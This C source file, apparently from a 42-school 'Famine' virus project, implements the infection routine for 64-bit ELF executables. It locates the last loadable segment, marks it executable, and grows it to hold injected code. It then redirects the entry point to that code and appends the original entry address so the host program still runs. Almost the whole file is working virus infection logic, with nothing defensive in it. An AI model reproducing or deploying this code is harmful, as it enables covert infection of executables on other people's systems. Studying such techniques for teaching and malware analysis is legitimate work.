/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   pack_elf64.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/11 15:41:56 by root              #+#    #+#             */
/*   Updated: 2018/05/22 04:40:24 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "libft.h"
#include "famine.h"

extern uint32_t famine64_size;
void			famine64_func(void);

static void		change_file_headers(t_elf64 *elf);
static void		write_new_file(t_env *e, t_elf64 *elf);

void			pack_elf64(t_env *e)
{
	t_elf64		elf;

	ft_memset(&elf, 0, sizeof(elf));
	elf.header = (Elf64_Ehdr *)e->data;
	elf.section = (Elf64_Shdr *)(e->data + elf.header->e_shoff);
	elf.program = (Elf64_Phdr *)(e->data + elf.header->e_phoff);
	change_file_headers(&elf);
	write_new_file(e, &elf);
}

static void		change_file_headers(t_elf64 *elf)
{
/* 1. Find the highest memory mapped PT_LOAD segment */
	elf->iprogram = NULL;
	for (size_t i = 0; i < elf->header->e_phnum; i++) {
		if (elf->program[i].p_type == PT_LOAD) {
			if (!elf->iprogram ||
				elf->program[i].p_vaddr > elf->iprogram->p_vaddr) {
				elf->iprogram = &elf->program[i];
			}
		}
	}
/* 2. Compute the virtual address of our code */
	elf->new_entry = elf->iprogram->p_vaddr + elf->iprogram->p_memsz;
/* Extra: Change the offset of sections higher than our code offset, for debug. */
	for (size_t i = 0; i < elf->header->e_shnum; i++) {
		if (elf->section[i].sh_offset >= elf->iprogram->p_offset + elf->iprogram->p_memsz) {
			elf->section[i].sh_offset += famine64_size;
		}
	}
/* 3. Change the elf header */
	elf->old_entry = elf->header->e_entry;
	elf->header->e_entry = elf->new_entry;
	elf->header->e_shoff += famine64_size;
/* 4. Change the program header */
	if ((elf->iprogram->p_flags & PF_X) == 0)
		elf->iprogram->p_flags |= PF_X;
	elf->iprogram->p_memsz += famine64_size;
	elf->iprogram->p_filesz = elf->iprogram->p_memsz;
}

static void		write_new_file(t_env *e, t_elf64 *elf)
{
	char		*ptr;
	size_t		off;

	ptr = (char *)e->data;
/* Get the offset in file to write our code */
	off = elf->iprogram->p_offset + elf->iprogram->p_memsz - famine64_size;
	write(e->fd, ptr, off);
	write(e->fd, &famine64_func, famine64_size - sizeof(elf->old_entry));
	write(e->fd, &elf->old_entry, sizeof(elf->old_entry));
	write(e->fd, ptr + off, e->size - off);
	close(e->fd);
	e->fd = 0;
}

/*
  Ideas for compression:
	- Check the size between each sections offset + section size, see if there is no extra unused bytes.
	  ( > 4 bytes, for example).
	- Check google which section(s) can be removed (debugging, info, etc.)
*/
